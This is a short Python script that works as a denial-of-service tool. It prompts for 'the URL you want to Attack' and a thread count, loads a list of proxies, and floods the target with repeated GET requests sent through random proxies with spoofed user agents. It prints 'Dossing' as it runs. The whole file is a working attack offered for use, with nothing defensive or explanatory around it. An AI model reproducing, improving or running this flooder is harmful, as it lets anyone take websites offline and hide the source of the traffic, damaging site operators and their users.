import requests
from fake_useragent import UserAgent
import random
import threading


def random_user_agent():
    user_agent = UserAgent()
    headers ={
        'User-Agent': user_agent.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    return headers

print("""
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '

 Niha      
      
      """)

url=input("Enter the URL you want to Attack:")
Thread =int(input("Enter the No: of Threads:"))
# url = "http://ipinfo.io/json"
# Thread = 1024
valied_proxy=[]

with open("ValidProxy.txt","r") as f:
    valied_proxy = f.read().split("\n")

def send_req(url):
  print("Dossing.......")

  for _ in range(10):
        int = random.randint(0,len(valied_proxy) -1)
        try:
            # print(proxy)
            res = requests.get(url, proxies={
        'http': valied_proxy[int],
        'https': valied_proxy[int]
        })
            print(res.json())
        except Exception as e:
            print(f"Error making request to {url}: {e}")  


threads =[]

i=0
while i <= Thread:
    thread = threading.Thread(target=send_req, args=(url,))
    thread.start()
    threads.append(thread)
    i += 1

for thread in threads:
    thread.join()    








